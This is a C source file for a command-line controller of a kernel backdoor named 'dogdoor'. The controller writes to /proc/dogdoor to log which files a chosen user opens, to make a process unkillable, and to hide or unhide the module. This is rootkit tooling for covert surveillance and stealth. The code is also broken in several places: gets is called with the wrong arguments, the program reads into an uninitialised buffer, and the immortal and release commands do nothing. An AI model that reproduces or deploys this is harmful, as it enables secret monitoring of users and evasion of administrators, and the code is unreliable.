#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

void listCommand();
void getCommand(char* usercom, int* choice, char* arg);
void usernameToId(const char* username, int *userid);
int monitor(int userid);
int request();
void immortalProc(const int arg, int* procid);
void releaseProc(int* procid);
int hideDogdoor();
int showDogdoor();


int main() {
	char usercom[100];
	char arg[100];
	int choice;
	int userid = 0, procid = 0;
	int isHidden = 0;

	while (1) {

		listCommand(); // list all possible options
		getCommand(usercom, &choice, arg); // translate the received command into a command
																			// which dogdoor can interpret and execute it in kernel mode
		switch (choice) {

			case 0:
			usernameToId(arg, &userid);
			monitor(userid); break;
			case 1:
			request(); break;

			case 2:
			immortalProc(atoi(arg), &procid);
			break;
			case 3:
			releaseProc(&procid); break;

			case 4:
			if(!isHidden) {
				hideDogdoor();
				isHidden = 1;
			}
			break;
			case 5:
			if(isHidden) {
				showDogdoor();
				isHidden = 0;
			}

		}

		*usercom = 0;

	}

	return 0;
}



void listCommand() {
	printf("\n\n---------------------------------- C o m m a n d ----------------------------------\n");
	printf("- monitor 'USERNAME' : Log the names files that a user has accessed.\n");
	printf("- request : Request the recently opened files and prints it to the screen.\n\n");
	printf("- immortal 'PROCESS ID' : Make a specific process immortal not to be killed by any other processes\n");
	printf("- release 'PROCESS ID' : Release the process so that other processes might be able to kill it.\n\n");
	printf("- disappear : Make dogdoor disappeared.\n");
	printf("- appear : Make dogdoor appeared again.\n\n");
}

void getCommand(char* usercom, int* choice, char* arg) {
	char result[100];
	char* command[6] = {"monitor ", "request", "immortal ", "release", "disappear", "appear"};

	do {
		printf("\nPlease write a command: ");
		gets(usercom, sizeof(usercom));

		/* find out if the command is valid
		 * if so, translate it into a command interpreted by dogdoor
		 * and truncate a parameter if it is needed
		 */

		if (strncmp(usercom, command[0], strlen(command[0])) == 0) {
			strcpy(result, usercom + strlen(command[0])); // USERNAME
			*choice = 0;
			break;
		}
		else if (strcmp(usercom, command[1]) == 0) {
			*result = 0;
			*choice = 1;
			break;
		}
		else if (strncmp(usercom, command[2], strlen(command[2])) == 0) {
			strcpy(result, usercom + strlen(command[2])); // PROCESS ID
			*choice = 2;
			break;
		}
		else if (strncmp(usercom, command[3], strlen(command[3])) == 0) {
			strcpy(result, usercom + strlen(command[3])); // PROCESS ID
			*choice = 3;
			break;
		}
		else if (strcmp(usercom, command[4]) == 0) {
			*result = 0;
			*choice = 4;
			break;
		}
		else if (strcmp(usercom, command[5]) == 0) {
			*result = 0;
			*choice = 5;
			break;
		}

		printf("Invalid Command!\n"); // if a command is invalid, notify a user
		*result = 0;

	} while (1);

	strcpy(arg, result);

}

void usernameToId(const char* username, int* userid) {
	struct passwd *p = getpwnam(username);

	if(p == NULL) {
		printf(">> USERNAME '%s' doesn't exist.\n", username);
		return;
	}

	printf(">> USERID of '%s' is %d.\n", username, p->pw_uid);
	*userid = p->pw_uid;
}

int monitor(int userid) {
	int fd;
	char buf[10];

	if((fd = open("/proc/dogdoor", O_RDWR)) == -1) {
		fprintf(stderr, "Fail to open 'dogdoor' : %s\n", strerror(errno));
		return -1;
	}

	sprintf(buf, "%d", userid);
	write(fd, buf, strlen(buf) + 1);
	close(fd);

	return 0;
}

int request() {
	int fd;
	char buf[1000];

	int i = 0, num = 0;
	const int max = 10;

	if((fd = open("/proc/dogdoor", O_RDWR)) == -1) {
		fprintf(stderr, "Fail to open 'dogdoor' : %s\n", strerror(errno));
		return -1;
	}

	read(fd, buf, strlen(buf));
	close(fd);

	while(1) {
		if(buf[i] == '&') { // tokenize a string that consists of a filename and a delimiter '&'
			num += 1;
			i++;
			printf("\n");
			continue;
		}

		if(strlen(buf) == i || num == max)
			break;

		printf("%c", buf[i++]);
	}

	return 0;
}

void immortalProc(const int arg, int* procid) {
	if(kill(arg, 0) == 0) { // check if a process is running now
		*procid = arg;
		printf(">> %d process becomes immortal.\n", *procid);
	}

	else
		printf(">> %d process is not running now.\n", arg);
}

void releaseProc(int* procid) {
	if(*procid == 0)
		printf(">> There's no immortal prcess yet.\n");

	else {
		kill(*procid, 0);
		printf(">> %d process is released.\n", *procid);
		*procid = 0;
	}
}

int hideDogdoor() {
	int fd;
	char buf[10];

	if((fd = open("/proc/dogdoor", O_RDWR)) == -1) {
		fprintf(stderr, "Fail to open 'dogdoor' : %s\n", strerror(errno));
		return -1;
  }

	sprintf(buf, "%s", "hide");
	write(fd, buf, strlen(buf) + 1);
	close(fd);

	return 0;
}

int showDogdoor() {
	int fd;
	char buf[10];

	if((fd = open("/proc/dogdoor", O_RDWR)) == -1) {
		fprintf(stderr, "Fail to open 'dogdoor' : %s\n", strerror(errno));
		return -1;
	}

	sprintf(buf, "%s", "unhide");
	write(fd, buf, strlen(buf) + 1);
	close(fd);

	return 0;
}

